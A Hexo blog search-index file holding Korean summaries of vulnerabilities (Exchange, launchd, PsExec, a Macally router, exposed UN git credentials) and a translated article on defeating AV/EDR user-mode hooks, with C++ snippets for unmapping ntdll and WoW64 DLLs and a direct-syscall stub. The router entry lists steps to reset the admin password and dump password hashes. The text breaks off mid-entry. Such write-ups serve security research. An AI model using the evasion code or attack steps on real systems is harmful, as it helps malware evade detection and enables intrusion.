<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-16875: RCE in MS Office 365</title>
    <link href="/2021/01/13/fabu1ous/2021-01-13/"/>
    <url>/2021/01/13/fabu1ous/2021-01-13/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://srcincite.io/blog/2021/01/12/making-clouds-rain-rce-in-office-365.html">https://srcincite.io/blog/2021/01/12/making-clouds-rain-rce-in-office-365.html</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Exchange server released Before 09/08/2020</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Microsoft office 365 Exchange server에서 발견된 CVE-2020-16875의 write-up이 공개되었습니다. <code>New-DlpPolicy</code> cmdlet의 validation 작업을 하는  <code>NewDlpPolicy.InternalValidate()</code> 함수에서 유저로부터 받은 TemplateData를  pipeline에 추가한 후 Powershell command로 실행하기 때문에 code injection취약점이 존재합니다. 이를 악용할 경우 SYSTEM권한으로 원격 코드 실행을 할 수 있습니다.</p><p> <code>NewDlpPolicy.InternalValidate()</code>가 호출하는 <code>DlpPolicyTemplateMetaData.ValidateCmdletParameters()</code> 함수는 다음과 같이 패치되었습니다. </p><ol><li>Inline command 사용을 막기 위한 검사 수행</li><li>validate 하려는 command 문자열이  <code>New-TransportRule</code>로 시작하는지 검사</li><li>validate 하려는 command 문자열이 <code>-DlpPolicy</code>을 담고 있는지 검사</li></ol><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://docs.microsoft.com/en-us/powershell/scripting/developer/cmdlet/cmdlet-overview?view=powershell-7.1#:~:text=A%20cmdlet%20is%20a%20lightweight,them%20programmatically%20through%20PowerShell%20APIs">https://docs.microsoft.com/en-us/powershell/scripting/developer/cmdlet/cmdlet-overview?view=powershell-7.1#:~:text=A%20cmdlet%20is%20a%20lightweight,them%20programmatically%20through%20PowerShell%20APIs</a>.</p><p><a href="https://docs.microsoft.com/en-us/powershell/module/exchange/new-dlppolicy?view=exchange-ps">https://docs.microsoft.com/en-us/powershell/module/exchange/new-dlppolicy?view=exchange-ps</a></p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>windows</tag>
      
      <tag>rce</tag>
      
      <tag>office 365</tag>
      
      <tag>exchange</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-9971 : macOS/iOS XPC 서비스 관리 앱에서 발견된 권한 상승 취약점</title>
    <link href="/2021/01/12/l0ch/2021-01-12/"/>
    <url>/2021/01/12/l0ch/2021-01-12/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://xlab.tencent.com/en/2021/01/11/cve-2020-9971-abusing-xpc-service-to-elevate-privilege/">CVE-2020-9971 Abusing XPC Service mechanism to elevate privilege in macOS/iOS</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>macOS &lt; Big Sur<br>iOS  &lt; 13.5</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>launchd는 macOS에서 <code>inetd</code>, <code>xinted</code>를 대체하는 서비스 관리 데몬입니다.<br>이러한 <code>launchd</code> 애플리케이션에서 프로세스 간 통신 프로토콜을 제공하는 XPC 서비스를 관리할 때 권한 상승이 가능한 취약점의 세부 정보가 공개되었습니다.</p><p><code>launchd</code>는 <code>launchd process domain</code> 을 통해 XPC 서비스를 지정된 프로세스로 제한할 수 있으며 프로세스 도메인은 소유자 프로세스만 수정이 가능합니다. 그러나 Big Sur 이전의 <code>launchd</code>에서 프로세스 도메인에 XPC를 추가할 때 호출자 pid와 프로세스 도메인의 소유자 pid를 확인하지 않아 프로세스가 다른 임의의 프로세스에 XPC 서비스를 추가할 수 있습니다.</p><p>해당 취약점을 악용하면 해커의 프로세스(애플리케이션)가 루트 권한으로 실행되는 프로세스의 도메인에 임의의 사용자 지정 XPC 서비스를 추가할 수 있고, 추가된 XPC 서비스가 루트 권한으로 실행됩니다.</p><p>iOS 또한 macOS와 동일한 <code>launchd</code> 로직을 사용하고 있으며 iOS 13.5 이전 버전에 같은 취약점이 존재합니다. 애플은 호출자 pid가 대상 프로세스 도메인의 소유자인지 확인하는 코드를 추가해 해당 취약점을 패치했습니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>eop</tag>
      
      <tag>ios</tag>
      
      <tag>L0ch</tag>
      
      <tag>apple</tag>
      
      <tag>macos</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] 유엔환경계획(UNEP) 10만명 이상 직원 기록 접근</title>
    <link href="/2021/01/11/idioth/2021-01-11/"/>
    <url>/2021/01/11/idioth/2021-01-11/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://johnjhacking.com/blog/unep-breach/">UNEP Breached, 100K+ Employee Records Accessed</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>ilo.org</li><li>unep.org</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>유엔에서 Git Credentials이 노출된 endpoint를 통해 직원들의 기록 및 프로젝트, 보고서 등의 정보에 접근할 수 있는 취약점이 발견되었습니다. ilo.org의 하위 도메인에 노출된 .git content가 존재합니다. <a href="https://github.com/arthaud/git-dumper">git-dumper</a>를 사용하여 프로젝트 폴더를 덤프할 수 있고 코드에 노출된 자격 증명으로 mysql 데이터베이스와 survey management platform에 접근할 수 있습니다.</p><p><img src="/2021/01/11/idioth/2021-01-11/image0.png"></p><p>또한 unep.org에서  <code>.git-credentials</code>가 노출된 서브 도메인이 존재합니다. GitHub credentials를 통해 private project에 접근할 수 있고 데이터베이스 및 각종 애플리케이션 정보에 접근할 수 있습니다.</p><p><img src="/2021/01/11/idioth/2021-01-11/image1.png"></p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>idioth</tag>
      
      <tag>git dump</tag>
      
      <tag>git credential</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Translation] MeMFuck: 유저 모드 후킹 우회</title>
    <link href="/2021/01/10/idioth/memfuck/"/>
    <url>/2021/01/10/idioth/memfuck/</url>
    
    <content type="html"><![CDATA[<blockquote><p>원문 글 : <a href="https://winternl.com/memfuck/">MemFuck: Bypassing User-Mode Hooks</a></p></blockquote><h2 id="서문"><a href="#서문" class="headerlink" title="서문"></a>서문</h2><p>동적 악성코드 분석은 많은 AV/EDR/MDS에서 악성 프로그램을 탐지하는데 자주 사용하는 방식이다. 동적 분석은 정적 분석과 달리 실행 과정에서 만들어진 윈도우 API 호출을 캡처하고 분석하며 정적 분석보다 탐지율이 높다. system call을 캡처하는  많은 기술이 있지만 가장 많이 사용하는 것은 user-level hook이다. 이러한 hook은 악성 기능을 분석하기 위해 함수 호출을 가로챈다. 임의 실행 파일에서 API 호출의 시퀀스는 다음과 같다.</p><pre><code class="hljs ebnf"><span class="hljs-attribute">OpenProcess</span><span class="hljs-attribute">VirtualAllocEx</span><span class="hljs-attribute">WriteProcessMemory</span><span class="hljs-attribute">CreateRemoteThreadEx</span><span class="hljs-attribute">QueueUserAPC</span><span class="hljs-attribute">NtAlertResumeThread</span></code></pre><p>안티 바이러스들은 호출이나 그 조합을 기반으로 악성 행위를 정의한다. 안티 바이러스의 입장에서 특정한 호출 조합은 코드 인젝션이며 대부분 악의적이거나 원하지 않는 행동으로 판단된다.</p><p>user-mode hook은 안티 바이러스와 NGAV, EDR, sandbox, anti-cheat, DRM 등을 포함한 많은 보안 제품과 툴에서 사용된다. user-mode hook은 구현하기 쉽고, 안정적이고, 간단하며 성능 오버헤드가 적다.</p><p>대부분 user-land hook은 inline hook이며 control flow를 custom handler로 리다이렉트 시키기 위한 대상 함수 rewrite를 포함한다. 핸들러의 내부에서 파라미터들은 보존되고 요청된 함수를 실행하거나 분석할지 결정할 수 있다. 이것들은 잘 문서화되어 있으므로 이러한 개념에 익숙할 것이라고 가정할 것이다.</p><h2 id="32-bit-Hooks"><a href="#32-bit-Hooks" class="headerlink" title="32-bit Hooks"></a>32-bit Hooks</h2><p><img src="/2021/01/10/idioth/memfuck/image0.png"></p><p>32비트 user-land hook이 포함된다. 32비트 유저 모드 보안 제품은 대부분 가능한 깊은 위치에서 hook 하며 ntdll에 대부분의 의심스러운 함수들(NtQueueApcThread 등)이 존재한다. 해결 방법은 system call을 사용하여 원하는 기능을 직접적으로 호출하는 것이다. Ring3 후킹으로 모든 보안 제품을 우회할 수 있다.</p><p>필자는 5년 동안 32비트 윈도우를 접한 경우가 하나도 없으므로 일반적인 경우인 WoW64에서 동작하는 32비트 응용 프로그램에 대해 살펴볼 것이다.</p><h2 id="WoW64에서의-32비트-후킹"><a href="#WoW64에서의-32비트-후킹" class="headerlink" title="WoW64에서의 32비트 후킹"></a>WoW64에서의 32비트 후킹</h2><p><img src="/2021/01/10/idioth/memfuck/image1.png"></p><p>가장 흔한 악성코드의 인스턴스는 Wow64에서 동작하는 32비트 프로그램이다(64비트 머신에서 동작). NGAV와 EDR은 이러한 시나리오에서의 hook 구현이 미흡하다. 대부분 보안 제품은 x86 유저 모드 영역에서만 hook을 한다. user-mode hook을 활용하는 안티바이러스는 WoW64 layer에 hook을 위치하는 것이 좋지만 모든 업체가 그것을 구현하지는 않는다. <a href="https://www.mdsec.co.uk/2020/08/firewalker-a-new-approach-to-generically-bypass-user-space-edr-hooking/">Sophos 우회에 관한 MDSec의 게시글</a>을 보아라.</p><p>많은 보안 제품들이 32비트 프로세스에서 WoW64 실행을 모니터링하지 않는다는 사실은 오랫동안 알려져 있었고 <a href="https://blog.malwarebytes.com/threat-analysis/2018/01/a-coin-miner-with-a-heavens-gate/">악성코드 제작자</a>와 <a href="https://outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/">red-team</a>에 의해 공격당했다. 필자가 분석한 악성코드 중에 얼마나 많은 것들이 이를 악용한 <a href="https://github.com/rwfpl/rewolf-wow64ext">rewolf’s wow64ext</a>를 포함하는지 말할 수 없다.</p><h2 id="요약-기존-기술"><a href="#요약-기존-기술" class="headerlink" title="요약 : 기존 기술"></a>요약 : 기존 기술</h2><ul><li>단순히 함수의 Ntdll 버전을 호출하는 것</li><li><a href="https://web.archive.org/web/20190407064851/https://blog.ensilo.com/globeimposter-ransomware-technical">함수의 Wow64 버전을 호출하는 것</a></li><li><a href="https://cdn2.hubspot.net/hubfs/487909/ENSILO%20WHITEPAPER%20ENTER%20THE%20DARK%20GATE.pdf">직접 Syscall 호출</a></li><li>원본 thunk 추적 (<a href="https://www.mdsec.co.uk/2020/08/firewalker-a-new-approach-to-generically-bypass-user-space-edr-hooking/">FireWalker</a>)</li><li><a href="https://blog.malwarebytes.com/threat-analysis/2018/03/hancitor-fileless-attack-with-a-copy-trick/">보조 DLL 매핑</a></li><li>Code splicing (byte stealing)</li></ul><p>모두 잘 작동하고 좋지만 64비트 버전의 ntdll에 위치한 hook에서 동작하지 않을 수 있다. 필자의 관찰에서 이러한 레벨의 hook은 어떤 public 코드로도 본 적이 없고 어떤 안티바이러스도 구현하지 않았다. 몇 가지 존재할 것이라고 확신하지만 보지 못했다.</p><h2 id="MemFuck에-들어가며"><a href="#MemFuck에-들어가며" class="headerlink" title="MemFuck에 들어가며"></a>MemFuck에 들어가며</h2><p>Memfuck은 오직 PoC이며 production code와 유사하지 않다. 즉 필자는 유저 영역에서 가능한 강력한 anti-analysis 기술이라고 생각한다.</p><p>MemFuck은 다른 anti-analysis 방법으로 실험을 시작했다. 본질적으로 가능한 한 비어있는 프로세스를 생성하길 원했으므로 DLL이나 쉘 코드의 수정 없이 보안 제품을 attach 할 수 없었다. 필자는 2008년에 이 <a href="https://gynvael.coldwind.pl/?id=93">게시글</a>을 발견했는데 매우 흥미로웠다. 물론 32비트 윈도우 XP에서 많은 변화가 있었으므로 많은 코드가 호환되지 않지만 대부분의 개념이 존재한다.</p><p><img src="/2021/01/10/idioth/memfuck/image2.png"></p><p>무엇이 ntdll을 필요로 하는가? 모든 결과는 특정한 DLL에 의존하므로 이를 망쳐버리면 어떠한 일이 일어날까</p><h2 id="Unmap-Everything"><a href="#Unmap-Everything" class="headerlink" title="Unmap Everything"></a>Unmap Everything</h2><p>MemFuck은 32비트 주소 영역에서 가능한 모든 것을 unmap 하는 것에 의해 시작된다. 물론 PEB/PEB64, TEB/TEB64와 <a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/ns-ntddk-kuser_shared_data">KUSER_SHARED_DATA</a> (작년에 마침내 문서화되었다) 같이 해제가 불가능한 것들도 있다. 이에 대해 몇 가지 방법이 있지만 가능한 귀찮지 않은 방법을 선택하고 싶었다. 우리는 모든 것에 NtUnmapViewOfSection을 호출하는 x86 쉘 코드를 할당할 수 있지만 그렇게 ntdll을 unmap 하면 무슨 일이 일어날까? Ntdll은 자기 자신을 unmap 할 수 없으므로 이 방법은 동작하지 않는다. 다음 단계에서 필자는 code segment switching(Heaven’s Gate)을 통해 직접 syscall 호출을 시험해보았다. 32비트 주소 영역에서 64비트 syscall 실행은 충분히 가능하지만 이 방법은 몇 가지 이유로 이상적이지 않았다.</p><ul><li>32비트 주소 영역에서 코드가 매핑되고 실행되므로 분석하기 쉬울 것이다.</li><li>64비트 주소 영역은 여전히 손상되어 있지 않다.</li><li>이 기술은 user-mode hook을 우회하기 효과적이지만 이미 문서화되어 있다.</li></ul><p>전부는 아니지만 대부분 Ring3 hook을 활용하는 AV/EDR 업체들은 하나의 일반적인 가정을 한다고 생각한다. WoW64 위에서 실행하는 32비트 프로세스는 4GB로 제한된 주소 아래에서 사용자 정의된 코드를 가진다. 따라서 매핑되지 않은 코드를 더 많이 배치하고 기능을 계속할 수 있는 이 제한 이상의 메모리를 할당해보자. Alex Ionescu에 따르면 <a href="https://twitter.com/aionescu/status/677599528409677824?lang=en">이것은 가능하지 않다</a>. 그러나 Petr Benes와 얘기한 후 그는 최근 버전의 윈도우10에서 이러한 제한이 해제되었다고 생각한다. 윈도우10 Build 19041.508에서 테스트했다.</p><p>64비트 버전의 <a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntifs/nf-ntifs-ntallocatevirtualmemory">NtAllocateVirtualMemory</a> 호출하기 위해 <a href="https://github.com/rwfpl/rewolf-wow64ext">rewolf’s wow64ext</a>를 사용했다. 필자가 처음 호출을 시도했을 때 혼란스러운 결과를 봤다. BaseAddress 요청이 Null이면 운영체제가 메모리 할당할 위치를 결정한다. 물론 윈도우는 우리가 있어서는 안 되는 곳에 메모리를 할당하는 것을 원하지 않으며 64비트 호출은 32비트 주소 영역에 잘 할당된 메모리를 반환한다. ZeroBit 플래그를 망치는 것은 어떨까? 필자는 ZeroBit 플래그를 조작해서 가능한 높은 주소에 request 하는 방법을 설명하는 <a href="https://stackoverflow.com/questions/50429365/what-is-the-most-reliable-portable-way-to-allocate-memory-at-low-addresses-on">stackoverflow 게시글</a>을 찾았다. 다시 필자는 ZeroBit 플래그를 조작하여 64비트 NtAllocateVirtual request에 MEM_TOP_DOWN 플래그를 추가해보았다. 메모리가 살짝 높긴 하지만 32비트 주소를 만났다. 이 지점에서 매개변수를 조작하는 아이디어를 얻었다. 우리가 원하는 주소를 요청하자! 필자는 BaseAddress를 64비트 주소(많은 메모리와 3개의 DLL)로 설정했고 놀랍게도 그 주소에 할당됐다.</p><p><img src="/2021/01/10/idioth/memfuck/image3.png"></p><p>물론 여기서 우리가 첫 번째로 해야 할 것은 여기에 쉘 코드를 써서 어떠한 행동이 일어나는지 보는 것이다. <a href="https://github.com/jackullrich/ShellcodeStdio">ShellcodeStdio</a>를 사용해서 빠르고 쉽게 64비트 쉘 코드를 작성했다. 이 쉘 코드는 64비트 공간에 할당되고 쓰이며 기본적으로 32비트 유저 모드의 모든 것에 unmap을 시도한다.</p><p>첫 번째 시도에 대한 수도 코드는 아래와 같다.</p><pre><code class="hljs cpp">DEFINE_FUNC_PTR(<span class="hljs-string">&quot;ntdll.dll&quot;</span>, NtUnmapViewOfSection);DEFINE_FUNC_PTR(<span class="hljs-string">&quot;ntdll.dll&quot;</span>, NtProtectVirtualMemory);<span class="hljs-keyword">for</span> (DWORD m = <span class="hljs-number">0</span>; m &lt; <span class="hljs-number">0x80000000</span>; m += <span class="hljs-number">0x1000</span>)    &#123;      PVOID ptrToProtect = (PVOID)m;      ULONG dwBytesToProtect = <span class="hljs-number">1</span>;      ULONG dwOldProt = <span class="hljs-number">0</span>;      NtProtectVirtualMemory((HANDLE)<span class="hljs-number">-1</span>, &amp;ptrToProtect, &amp;dwBytesToProtect, PAGE_READWRITE, &amp;dwOldProt);      NtUnmapViewOfSection((HANDLE)<span class="hljs-number">-1</span>, (PVOID)m);    &#125;</code></pre><p><img src="/2021/01/10/idioth/memfuck/image4.png"></p><p>프로세스가 엉망이다. 그러나 여전히 코드는 실행되고 있으며 잘 동작하고 있다. anti-analysis을 하기에 상당히 좋은 환경이다. 32비트 주소 영역의 완전한 제어를 갖고 우리가 원하는 것을 확실히 로드하고 언로드 할 수 있다. OllyDbg와 x64dbg 같은 많은 디버거들은 여기서 크래시가 나서 분석을 계속하기 위해 Windbg를 사용했다.</p><h2 id="An-Interstring-Intermission"><a href="#An-Interstring-Intermission" class="headerlink" title="An Interstring Intermission"></a>An Interstring Intermission</h2><p>프로세스의 32비트 주소 영역을 완전히 지워버리면서 코드는 의도대로 실행하고 동작하도록 하는 목표에 거의 성공했었다. 여기에는 공격적인 결과와 방어적인 결과가 같이 있다. 아마 이 기간 동안 가장 흥미로운 사실 중 하나는 <a href="https://docs.microsoft.com/en-us/windows/win32/winprog64/exception-handling-under-wow64">MSDN 페이지</a>를 발견했을 때이다.</p><blockquote><p>WOW64는 x86 예외에 대한 전송으로 native x64, ia64 또는 ARM64 예외를 사용한다. 따라서 WOW64에서 동작하는 32비트 응용 프로그램에서 포착되지 않은 예외는 native 64비트 예외처럼 동작한다.</p></blockquote><p>4GB 경계 위의 주소에 64비트 쉘 코드를 쓸 수 있는데, 64비트 공간에 64비트 벡터 예외 처리기(Vectored Exception Handler)를 설치하며 32비트 예외에 의해 트리거 되고 Control Flow가 64bit VEH에 의해 리다이렉션 된다.</p><p><img src="/2021/01/10/idioth/memfuck/image5.png"></p><p>32비트 ntdll이 로드되어 제대로 됐음을 확신했다. 모든 것이 unmap 된 예외를 트리거하는 것은 쉽지만 처리할 WoW64 레이어로 전환할 코드가 없다. 하지만 이 아이디어에는 많은 흥미로운 잠재력이 있다.</p><h2 id="Ntdll-No-More"><a href="#Ntdll-No-More" class="headerlink" title="Ntdll No More"></a>Ntdll No More</h2><p>더 이상 어떤 목적을 위해서든 ntdll에 의존하지 않는다는 원래 개념으로 돌아가서 WoW64 계층에 남은 3개의 dll을 unmapping 하는 일이 남았다. WoW64는 대부분 시스템에서 거의 동일하다.(WoW64.dll, wow64win.dll, ntdll.dll)</p><p><img src="/2021/01/10/idioth/memfuck/image6.png"></p><p>32비트 코드로 돌아가지 않을 것이라고 생각하니 더 이상 필요하지 않은 이 dll들을 unmap 하자.</p><pre><code class="hljs cpp">DWORD64 addrWoW64 = <span class="hljs-number">0</span>;  DWORD64 addrWoW64Win = <span class="hljs-number">0</span>;  DWORD64 addrNtdll = <span class="hljs-number">0</span>;  PPEB peb64 = getPEB();  LIST_ENTRY* first = peb64-&gt;Ldr-&gt;InMemoryOrderModuleList.Flink;  LIST_ENTRY* ptr = first;  <span class="hljs-keyword">int</span> cntr = <span class="hljs-number">0</span>;  <span class="hljs-keyword">do</span> &#123;    LDR_DATA_TABLE_ENTRY* dte = getDataTableEntry(ptr);    ptr = ptr-&gt;Flink;    <span class="hljs-keyword">if</span> (cntr == <span class="hljs-number">1</span>) &#123;      addrNtdll = (DWORD64)dte-&gt;DllBase;    &#125;    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (cntr == <span class="hljs-number">2</span>) &#123;      addrWoW64 = (DWORD64)dte-&gt;DllBase;    &#125;    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (cntr == <span class="hljs-number">3</span>) &#123;      addrWoW64Win = (DWORD64)dte-&gt;DllBase;    &#125;    cntr++;  &#125; <span class="hljs-keyword">while</span> (ptr != first);  NtUnmapViewOfSection(<span class="hljs-number">-1</span>, addrWoW64);  NtUnmapViewOfSection(<span class="hljs-number">-1</span>, addrWoW64Win);</code></pre><p><img src="/2021/01/10/idioth/memfuck/image7.png"></p><p>32비트 주소 공간에 더 이상 hook은 존재하지 않으며 WoW64 dll(Wow64SystemServiceEx 등)에 있는 것도 다 사라졌다. 남은 일은 ntdll을 unmap 하는 것이다. 다시 한번 부모 모듈에서 NtUnmapViewOfSection을 호출하는 문제가 생겼다. 직접 system call을 하자.</p><p>64비트 MSVC 컴파일러가 inline assembly를 제공하지 않으므로 function ordering, 내부 코드 배치 제한으로 인해 system call stub에 새로운 메모리 영역을 할당하기로 결정했다. 윈도우 10 64비트의 Syscall stub은 아래와 같다.</p><pre><code class="hljs x86asm"><span class="hljs-keyword">mov</span> <span class="hljs-built_in">r10</span>, <span class="hljs-built_in">rcx</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">eax</span>, xxh<span class="hljs-keyword">syscall</span><span class="hljs-keyword">retn</span></code></pre><p>NtdllVirtualMemory를 호출하고 DWORD by DWORD로 코드를 작성해라. 그리고 typedef prototype을 할당하면 Nt* 함수를 쉽게 호출할 수 있다.</p><pre><code class="hljs cpp">DWORD dwCode1 = <span class="hljs-number">0xb8d18b4c</span>;  DWORD dwCode2 = <span class="hljs-number">0x0000002a</span>; <span class="hljs-comment">// syscall code for NtUnmapViewOfSection</span>  DWORD dwCode3 = <span class="hljs-number">0x90c3050f</span>;  <span class="hljs-comment">// mov r10, rcx ; 0x4c 0x8b 0xd1</span>  <span class="hljs-comment">// mov eax, xxh ; 0xb8 xx 00 00 00</span>  <span class="hljs-comment">// syscall ; 0x0f 0x05</span>  <span class="hljs-comment">// retn ; 0xc3</span>  *(DWORD*)syscallbase = dwCode1;  *((DWORD*)syscallbase + <span class="hljs-number">1</span>) = dwCode2;  *((DWORD*)syscallbase + <span class="hljs-number">2</span>) = dwCode3;  p_SysUnmapViewOfSection sysUnmap = (p_SysUnmapViewOfSection)syscallbase;</code></pre><p>마지막으로 64비트 ntdll에 대해 NtUnmapViewOfSection의 직접적인 system call 후에 프로세스에는 아무것도 없다. 안티 바이러스가 시도하고 hook 하는 user-mode에 남은 것이 없다. 주입된 DLL이 unmap 된지는 오래됐다.</p><p><img src="/2021/01/10/idioth/memfuck/image8.png"></p><p>여기부터 Rtl* 함수 사용 없이 syscall을 통해 직접 code injection이나 detected code를 실행하는 것이다. 이것을 하면서 WoW64에 관해 많은 것을 배웠고, 한계점과 특이점, 32비트와 64비트 VEH 같은 새로운 탐구 영역을 얻었다.</p><h2 id="Source-Code"><a href="#Source-Code" class="headerlink" title="Source Code"></a>Source Code</h2><p><a href="https://github.com/jackullrich/memfuck">Github 주소</a></p>]]></content>
    
    
    <categories>
      
      <category>Translation</category>
      
    </categories>
    
    
    <tags>
      
      <tag>idioth</tag>
      
      <tag>memfuck</tag>
      
      <tag>hook</tag>
      
      <tag>bypass</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] PsExec 0-day LPE non-official patch</title>
    <link href="/2021/01/09/fabu1ous/2021-01-09/"/>
    <url>/2021/01/09/fabu1ous/2021-01-09/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://blog.0patch.com/2021/01/local-privilege-escalation-0day-in.html">LPE 0day in PsExec</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Windows xp ~ Windows 10</p><p>PsExec v1.72</p><p>PsExec v2.2</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>PsExec를 사용하는 시스템에서 System 권한을 획득할 수 있는 전형적인 named pipe hijacking <a href="https://hackyboiz.github.io/2020/12/10/idioth/2020-12-10/">취약점</a>이 패치되었습니다. 해커는 PsExec가 기존에 존재하는 named pipe를 재사용할 때 권한 설정을 변경하지 않는다는 점을 악용해 System권한을 갖는 named pipe를 사용할 수 있게 되고 System 권한으로 임의의 프로세스를 생성할 수 있습니다.</p><p>0Patch는 이 취약점에 대한 패치를 공개하고 무료로 배포하고 있습니다. PsExec 서비스는 원격 request를 받아 처리하는 thread를 생성할 때 <code>CreateNamedPipe()</code>를 호출합니다. 0Patch가 공개한 패치에선 <code>CreateNamedPipe()</code>가 호출되기 전 <code>FILE_FLAG_FIRST_PIPE_INSTANCE</code> 플레그 값을 사용해 <code>CreateNamedPipe()</code>를 한 번 더 호출하는 것으로 동일한 이름의 named pipe가 존재하는지 확인합니다. 만약 동일한 이름의 named pipe가 이미 존재하면 Psexesvc.exe를 종료합니다.</p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/psexec">https://docs.microsoft.com/en-us/sysinternals/downloads/psexec</a></p><p><a href="https://github.com/tenable/poc/blob/master/Microsoft/Sysinternals/PsExecEscalate.cpp">https://github.com/tenable/poc/blob/master/Microsoft/Sysinternals/PsExecEscalate.cpp</a></p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>lpe</tag>
      
      <tag>named pipe</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-29669 : WIFI SD Hub Privilege Escalation Plugin</title>
    <link href="/2021/01/08/l0ch/2021-01-08/"/>
    <url>/2021/01/08/l0ch/2021-01-08/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://github.com/code-byter/CVE-2020-29669">https://github.com/code-byter/CVE-2020-29669</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Macally WIFISD2-2A82 Travel Router (펌웨어 버전 : 2.000.010)</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>무선 미디어 공유가 가능한 WIFI SD 허브인 Macally WIFISD2-2A82 제품에서 root로 권한 상승이 가능한 취약점이 공개되었습니다.</p><p>취약점의 세부 공격 단계는 아래와 같습니다.</p><ol><li>해커는 웹 인터페이스에서 게스트 계정으로 로그인합니다.</li><li>패스워드 재설정 페이지에서 admin의 패스워드로 설정할 값을 입력합니다.</li><li>BurpSuite로 해당 요청에서 <code>name</code> 필드값을 admin으로 변경해 요청하면 admin의 패스워드가 재설정됩니다.</li><li>telnet을 통해 admin과 재설정한 패스워드를 입력해 접속하면 <code>/etc/passwd</code> 의 root를 포함한 모든 계정의 패스워드 해시를 유출할 수 있습니다.</li></ol><p>해당 취약점을 악용하면 패스워드 해시를 크래킹해 root 쉘에 접근할 수 있습니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>eop</tag>
      
      <tag>L0ch</tag>
      
      <tag>router</tag>
      
      <tag>wifi sd</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] SoftMaker Office TextMaker에서 발견된 세 가지 취약점</title>
    <link href="/2021/01/07/idioth/2021-01-07/"/>
    <url>/2021/01/07/idioth/2021-01-07/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://blog.talosintelligence.com/2021/01/vuln-spotlight-softmaker-office-textmaker-jan-2021.html?utm_source=feedburner&utm_medium=feed&utm_campaign=Feed:+feedburner/Talos+(Talos%E2%84%A2+Blog)">Vulnerability Spotlight: Multiple vulnerabilities in SoftMaker Office TextMaker</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>SoftMaker Software GmbH SoftMaker Office TextMaker 2021, revision 1014</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>SoftMaker Software GmbH는 오피스 소프트웨어를 개발하는 독일 소프트웨어 회사입니다. 플래그십 제품인 SoftMaker Office는 워드, 스프레드 시트, 프레젠테이션, 스크립트 등등의 기능을 지원합니다. 이 Office 제품군인 TextMaker의 document parsing 기능에서 세 가지 취약점이 발견되었습니다.</p><p><strong>CVE-2020-13544: Sign-extension</strong></p><p>document parser가 record를 parsing 할 때 index table record를 16bit unsigned 값으로 사용하지만 루프 문에서 index를 비교할 때 16bit signed 값으로 사용하여 index table record에 지정된 크기보다 많은 횟수를 반복할 수 있습니다. 따라서 index를 통해 heap 할당 범위 밖에 접근할 수 있습니다.</p><p><strong>CVE-2020-13545: Integer conversion</strong></p><p>document parser가 record를 스캔하고 읽어 올 때 파일 스트림의 현재 위치에서 record에서 사용하는 바이트 크기를 나타내는 32bit integer를 읽어옵니다. 버퍼를 할당할 때 signed multiplication을 사용하지만 버퍼의 끝을 계산할 때 unsigned multiplication을 사용하여 heap 할당 범위 밖의 주소에 접근할 수 있습니다.</p><p><strong>CVE-2020-13546: Integer overflow</strong></p><p>document parser가 record를 